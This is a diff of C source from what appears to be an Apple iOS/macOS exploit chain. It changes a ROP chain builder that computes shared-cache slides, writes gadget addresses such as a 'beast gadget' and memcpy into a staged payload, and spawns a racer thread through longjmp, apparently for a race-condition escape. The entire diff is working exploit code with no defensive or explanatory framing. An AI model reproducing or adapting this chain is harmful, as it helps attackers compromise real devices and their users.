@@ -87,8 +87,10 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 	while (next != NULL) {
 		switch (next->type) {
 			case CODEADDR:
-				// value doesn't need to be slid anymore
 				buf = next->value;
+				// we add and then subtract cause otherwise this could underflow
+				buf += offsets->new_cache_addr;
+				buf -= 0x180000000;
 				write(fd,&buf,8);
 				chain_pos += 8;
 				break;
@@ -109,9 +111,10 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				break;
 			case BARRIER:
 				if (chain_pos > next->value) {
-					printf("stage 3 doesn't have enought space\n");
+					printf("stage 2 doesn't have enought space\n");
+					exit(1);
 				}
-				uint64_t diff = next->value - chain_pos;
+				uint64_t diff = next->value - chain_pos - offsets->stage2_base;
 				chain_pos += diff;
 				offset_delta += diff;
 				char * tmp = malloc(diff);
@@ -289,13 +292,14 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 		}
 		next = next->next;
 	}
+	offsets->stage2_size = chain_pos + 0x1000;
 }
 uint64_t get_addr_from_name(offset_struct_t * offsets, char * name) {
 	uint64_t sym = dlsym(RTLD_DEFAULT,name);
 	uint64_t cache_addr = 0;
 	syscall(294, &cache_addr);
 	sym -= cache_addr;
-	sym += offsets->new_cache_addr;
+	sym += 0x180000000;
 	return sym;
 }
 char * pos_description_DBG(int pos, int longjmp_buf) {
@@ -323,23 +327,25 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 	int longjmp_buf = 1;
 	int pos = 0;
 	char * pos_buf = NULL;
-	printf("STAGE 3 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm\n",offsets->stage2_base);
+	printf("STAGE 2 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm\n",offsets->stage2_base);
 	while (next != NULL) {
 		switch (next->type) {
 			case CODEADDR:
-				// value doesn't need to be slid anymore
 				buf = next->value;
+				// we add and then we subtract otherwise it could underflow
+				buf += offsets->new_cache_addr;
+				buf -= 0x180000000;
 				printf("0x%.8llx: ",current_addr);
-				printf("0x%.8llx (code address) ",buf);
-				if (buf == offsets->BEAST_GADGET) {
+				printf("0x%.8llx (code address org:%llx) ",buf,next->value);
+				if (next->value == offsets->BEAST_GADGET) {
 					printf("Beast gadget (x30)\n");
 					printf("=\n");
 					pos = 0;
-				}else if (buf == offsets->BEAST_GADGET_LOADER) {
+				}else if (next->value == offsets->BEAST_GADGET_LOADER) {
 					printf("Beast gadget loader (x30)\n");
-				}else if (buf == offsets->str_x0_gadget) {
+				}else if (next->value == offsets->str_x0_gadget) {
 					printf("return val (x0) storing gadget (ARG 8) is the address where we will store to\n");
-				}else if (buf == offsets->memcpy) {
+				}else if (next->value == offsets->memcpy) {
 					printf("memcpy\n");
 				}else{
 					printf("normal call if you want to know what this is you have to check your offset struct\n");
@@ -373,7 +379,8 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 				break;
 			case BARRIER:
 				if (current_addr > next->value) {
-					printf("stage 3 doesn't have enought space\n");
+					printf("stage 2 doesn't have enought space\n");
+					exit(1);
 				}
 				uint64_t diff = next->value - current_addr;
 				current_addr += diff;
@@ -700,7 +707,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// spawn racer thread
 	DEFINE_ROP_VAR("racer_thread",sizeof(pthread_t),tmp);
 	ROP_VAR_ARG("racer_thread",1);
-	CALL("pthread_create",0,offsets->longjmp,offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/,0,0,0,0,0);
+	CALL("pthread_create",0,offsets->longjmp-0x18095c2e4+offsets->new_cache_addr /*slide it here*/,offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/,0,0,0,0,0);
 
 
 	ADD_COMMENT("mach_task_self");
